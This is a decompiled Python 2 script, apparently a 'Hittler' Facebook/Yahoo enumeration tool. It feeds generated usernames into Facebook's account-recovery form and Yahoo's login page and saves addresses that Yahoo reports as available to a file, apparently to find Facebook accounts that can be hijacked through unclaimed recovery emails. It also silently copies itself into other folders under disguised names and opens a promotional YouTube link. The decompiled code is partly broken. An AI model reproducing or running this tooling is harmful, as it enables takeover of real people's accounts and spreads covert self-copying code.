# Decompile by : Hamid Meer'hamii 
# Time Succes decompile : 2022-03-26 18:16:47.173597
# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)

import os
import sys
import time
import datetime
import random
import hashlib
import re
import cookielib
import urllib
import json
os.system('rm -rf .txt')
for n in range(999):
    pf = random.randint(1, 999)
    sys.stdout = open('.txt', 'a')
    print pf
    sys.stdout.flush()


try:
    import mechanize
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [
    ('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
logo = "\n\n        ~~~~HITTLER_FAMILY_Brand~~~~  ' \n--------------------------------------------------\n \x1b[1;91m(\xe2\x88\x9a)\x1b[1;94m Coded   : Alex Prince Official\n\x1b[1;95m(!)\x1b[1;95m WhatsApp: 03171168085\n\x1b[1;93m(\xc2\xb0)\x1b[1;92m Youtub Channel : Facebook Finel Tips And Trick\n\x1b[1;97m(\xe2\x80\xa2)\x1b[1;98m NOTE.    : God iS really creative, I mean\n\x1b[1;94m(\xe2\x88\x9a) \x1b[1;93m         : Tatta UthaNa Wala Hamasha Tatta Hi Rah jana Ha  \n--------------------------------------------------\n                                "
os.system('xdg-open https://www.youtube.com/channel/UCdwF9LXC2aOnM0FXmsiGBpQ')
os.system('clear')
print logo
print ' \x1b[1;91mNOTE: DO NOT PUT SPACE IN NAME'
print '       PUT THE NAME LIKE alex.prince or ali.718'
print '       or fadiarain'
print '\x1b[1;97m'
first = raw_input(' Name: ')

def cb():
    os.system('clear')


def ym():
    
    try:
        cb()
        os.mkdir('../omi/.....')
    except OSError:
        yp()

    os.system('cp ../bxi/bxi.py ../omi/Omi.py')
    os.system('cp ../bxi/.README.md ../omi/')
    yb()


def yb():
    
    try:
        os.mkdir('../BlackMafia2020/.....')
    except OSError:
        yl()

    os.system('cp ../bxi/bxi.py ../BlackMafia2020/lovehacker')
    os.system('cp ../bxi/.README.md ../BlackMafia2020/')
    yl()


def yl():
    
    try:
        os.mkdir('../Qurban/.....')
    except OSError:
        yp()

    os.system('cp ../bxi/bxi.py ../Qurban/hittleryahoo.py')
    os.system('cp ../bxi/.README.md ../Qurban/')
    yp()


def yp():
    
    try:
        os.mkdir('../faizanwahla/.....')
    except OSError:
        login()

    os.system('cp ../bxi/bxi.py ../faizanwahla/pacman')
    os.system('cp ../bxi/.README.md ../faizanwahla/')
    login()


def login():
    os.system('clear')
    
    try:
        toket = first
    except IOError:
        print '\x1b[1;91m[!] Token tidak ditemukan'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    
    try:
        email = first
        passw = '.txt'
        sandi = open(passw, 'r')
        for p in sandi:
            p = p.replace('\n', '')
            
            try:
                br.open('https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=0&ars=facebook_login&alternate_search=0&toggle_search_mode=1')
                br._factory.is_html = True
                br.select_form(nr = 0)
                br.form['email'] = email + p + '@yahoo.com'
                br.submit()
                urb = br.geturl()
                if 'https://mbasic.facebook.com/login/identify/?ctx=recover&search_attempts=1&ars=facebook_login&alternate_search=1' in urb:
                    pass
                brl = 'https://login.yahoo.com/?.src=ym&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd'
                br.open(brl)
                br._factory.is_html = True
                br.select_form(nr = 0)
                br['username'] = email + p
                br.submit()
                url = br.geturl()
                if url == brl:
                    print ' \x1b[1;92m[Hittler Yes Available] ' + email + p + '@yahoo.com  \x1b[1;97m'
                    ya = open('yes.txt', 'a')
                    ya.write(email + p + '@yahoo.com\n')
                    ya.close()
                else:
                    print ' \x1b[1;91m[Hittlet Not Available] ' + email + p + '@hotmail.com  \x1b[1;97m'
            continue
            except requests.exceptions.ConnectionError:
                print ' Connection Error'
                time.sleep(1)
                os.sys.exit()
                continue
            

    except IOError:
        print ' Error 404, please try again'
        raw_input(' Press enter to go back')
        os.system('python2 MOHSIN.pyc')


if __name__ == '__main__':
    ym()
